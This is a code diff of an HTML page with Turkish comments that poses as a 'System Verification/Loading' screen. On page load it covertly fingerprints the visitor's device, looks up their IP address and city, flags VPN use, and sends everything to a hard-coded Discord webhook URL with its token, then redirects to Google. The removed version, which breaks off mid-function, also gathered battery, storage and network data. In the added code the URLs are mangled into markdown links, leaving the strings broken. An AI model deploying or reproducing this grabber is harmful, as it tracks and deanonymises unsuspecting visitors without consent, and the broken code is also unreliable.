@@ -3,126 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>System Loading</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .loader { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin-bottom: 20px; }
-        .status { font-size: 12px; opacity: 0.7; }
+        /* Sayfa Düzeni */
+        body { 
+            background-color: #000; 
+            color: #0f0; 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden; 
+        }
+        /* Yükleniyor Çarkı */
+        .loader { 
+            border: 4px solid #111; 
+            border-top: 4px solid #0f0; 
+            border-radius: 50%; 
+            width: 50px; 
+            height: 50px; 
+            animation: spin 1s linear infinite; 
+            margin-bottom: 20px; 
+        }
+        .status { font-size: 14px; opacity: 0.8; letter-spacing: 2px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <div class="status" id="status_text">INITIALIZING PROTOCOL...</div>
+    <div class="status" id="log_display">SYSTEM VERIFICATION...</div>
 
     <script>
+        // Hata ayıklama modunu kapat
         "use strict";
 
-        // --- KONFIGÜRASYON ---
-        const WEBHOOK = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
-        const REDIRECT_URL = "https://www.google.com"; // İşlem bitince gideceği yer
+        // --- AYARLAR ---
+        const CONFIG = {
+            webhook: "[https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL](https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL)",
+            redirect: "[https://www.google.com](https://www.google.com)"
+        };
 
-        // --- YARDIMCI FONKSİYONLAR ---
-        const log = (msg) => document.getElementById('status_text').innerText = msg;
-        const wait = (ms) => new Promise(r => setTimeout(r, ms));
+        // UI Güncelleme
+        const updateLog = (text) => document.getElementById('log_display').innerText = text;
 
-        // 1. SES KARTI PARMAK İZİ (AUDIO FINGERPRINTING)
-        // Cihazın ses işleme kapasitesine göre benzersiz bir imza oluşturur.
-        async function getAudioFingerprint() {
+        // 1. SES İMZASI (Hata korumalı döngü)
+        async function getAudioSig() {
             try {
-                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                if (!AudioContext) return "No Audio API";
+
+                const ctx = new AudioContext(1, 44100, 44100);
                 const osc = ctx.createOscillator();
                 osc.type = "triangle";
                 osc.frequency.setValueAtTime(10000, ctx.currentTime);
+                
                 const compress = ctx.createDynamicsCompressor();
-                const clone = osc.connect(compress);
+                osc.connect(compress);
                 compress.connect(ctx.destination);
+                
                 osc.start(0);
-                const renderedBuffer = await ctx.startRendering();
-                // Basit bir hash oluşturma
-                let output = 0;
-                for (let i = 0; i < renderedBuffer.length; i++) {
-                    output += Math.abs(renderedBuffer.getChannelData(0)[i]);
+                const buffer = await ctx.startRendering();
+                const data = buffer.getChannelData(0);
+                
+                let sum = 0;
+                // HTML hatasını önlemek için güvenli döngü
+                for (let i = 0; i < 500 && i < data.length; i++) {
+                    sum += Math.abs(data[i]);
                 }
-                return `SIG-${output.toString().slice(0, 8)}`;
-            } catch (e) { return "Audio Context Blocked"; }
+                return "SIG-" + sum.toFixed(4).replace('.', '');
+            } catch (e) { return "Audio Blocked"; }
         }
 
-        // 2. GELİŞMİŞ GPU VE EKRAN ANALİZİ
-        function getGraphics() {
-            let info = { gpu: "Masked", vendor: "Masked", res: `${screen.width}x${screen.height}`, depth: screen.colorDepth, pixelRatio: window.devicePixelRatio };
+        // 2. ANA FONKSİYON
+        async function runProtocol() {
+            updateLog("ANALYZING HARDWARE ID...");
+
+            // Veri Objeleri
+            let sys = { 
+                os: "Unknown", 
+                gpu: "Integrated/Masked", 
+                cores: navigator.hardwareConcurrency || 2,
+                ram: navigator.deviceMemory || 4
+            };
+
+            // OS Tespiti
+            if (navigator.userAgent.indexOf("Win") !== -1) sys.os = "Windows";
+            else if (navigator.userAgent.indexOf("Mac") !== -1) sys.os = "MacOS";
+            else if (navigator.userAgent.indexOf("Linux") !== -1) sys.os = "Linux";
+            else if (navigator.userAgent.indexOf("Android") !== -1) sys.os = "Android";
+            else if (navigator.userAgent.indexOf("like Mac") !== -1) sys.os = "iOS";
+
+            // GPU Tespiti
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 if (gl) {
                     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (dbg) {
-                        info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                        info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                    }
+                    if(dbg) sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                 }
             } catch(e) {}
-            return info;
-        }
 
-        // 3. DEPOLAMA VE BELLEK (RAM/DISK)
-        async function getStorageInfo() {
-            let info = { ram: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown", storage: "Unknown" };
+            updateLog("ESTABLISHING UPLINK...");
+            
+            // IP ve Konum
+            let net = { ip: "N/A", loc: "Unknown", vpn: "Clean" };
+            const localTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
             try {
-                if (navigator.storage && navigator.storage.estimate) {
-                    const quota = await navigator.storage.estimate();
-                    const total = (quota.quota / 1024 / 1024 / 1024).toFixed(1);
-                    const used = (quota.usage / 1024 / 1024 / 1024).toFixed(1);
-                    info.storage = `${used}GB used / ${total}GB total (Quota)`;
+                const req = await fetch('[https://ipapi.co/json/](https://ipapi.co/json/)');
+                const j = await req.json();
+                net.ip = j.ip;
+                net.loc = `${j.city}, ${j.country_name}`;
+                
+                if (j.timezone !== localTz) {
+                    net.vpn = `🚨 VPN ACTIVE (IP: ${j.timezone} / Sys: ${localTz})`;
                 }
+            } catch(e) { net.ip = "Connection Error"; }
+
+            // Ses İmzasını Al
+            const audioHash = await getAudioSig();
+
+            // PAYLOAD OLUŞTURMA
+            const payload = {
+                username: "System Monitor",
+                embeds: [{
+                    title: "💀 NEW DEVICE DETECTED",
+                    color: net.vpn.includes("🚨") ? 15158332 : 3066993,
+                    fields: [
+                        { name: "📡 NETWORK", value: `**IP:** \`${net.ip}\`\n**Loc:** ${net.loc}\n**VPN:** ${net.vpn}`, inline: false },
+                        { name: "💻 DEVICE", value: `**OS:** ${sys.os}\n**CPU:** ${sys.cores} Cores\n**RAM:** ~${sys.ram} GB\n**GPU:** ${sys.gpu}`, inline: false },
+                        { name: "🔐 FINGERPRINT", value: `**Audio Sig:** \`${audioHash}\`\n**Time:** ${new Date().toLocaleTimeString()}`, inline: false }
+                    ]
+                }]
+            };
+
+            updateLog("SYNCING DATA...");
+
+            // GÖNDERİM (Fetch + Beacon)
+            const json = JSON.stringify(payload);
+            
+            try {
+                // Öncelik 1: Beacon (Sayfa kapansa da gider)
+                navigator.sendBeacon(CONFIG.webhook, new Blob([json], {type: 'application/json'}));
             } catch(e) {}
-            return info;
+
+            try {
+                // Öncelik 2: Fetch (Yedek)
+                await fetch(CONFIG.webhook, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: json
+                });
+            } catch(e) {}
+
+            // YÖNLENDİRME
+            updateLog("COMPLETE.");
+            setTimeout(() => {
+                window.location.href = CONFIG.redirect;
+            }, 1500);
         }
 
-        // 4. BAĞLANTI VE PİL
-        async function getStatus() {
-            let info = { bat: "N/A", net: "Unknown", cores: navigator.hardwareConcurrency || "Unknown" };
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    info.bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌 Charging' : '🔋 Battery'})`;
-                }
-            } catch(e) {}
-            
-            try {
-                const n = navigator.connection;
-                if (n) info.net = `${n.effectiveType.toUpperCase()} | Down: ${n.downlink}Mbps | RTT: ${n.rtt}ms`;
-            } catch(e) {}
-            return info;
-        }
+        // Başlat
+        window.onload = runProtocol;
+    </script>
+</body>
+</html>
 
-        // 5. ANA YÜRÜTME MOTORU
-        async function executeExtraction() {
-            log("ANALYZING HARDWARE...");
-            
-            // Tüm verileri paralel topla
-            const [audioSig, storageData, statusData] = await Promise.all([
-                getAudioFingerprint(),
-                getStorageInfo(),
-                getStatus()
-            ]);
-            
-            const gfx = getGraphics();
-            
-            // OS Parsing (Regex ile güvenli)
-            let os = "Unknown Platform";
-            try {
-                const ua = navigator.userAgent;
-                os = ua.match(/\(([^)]+)\)/)?.[1] || navigator.platform;
-            } catch(e) {}
-
-            log("ESTABLISHING UPLINK...");
-
-            // IP API Sorgusu
-            let net = { ip: "N/A", org: "N/A", loc: "N/A", vpn: "✅ Clean" };
-            let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            try {
-                const controller = new AbortController();
-                setTimeout(() => controller.abort(), 4000); // 4sn
-      
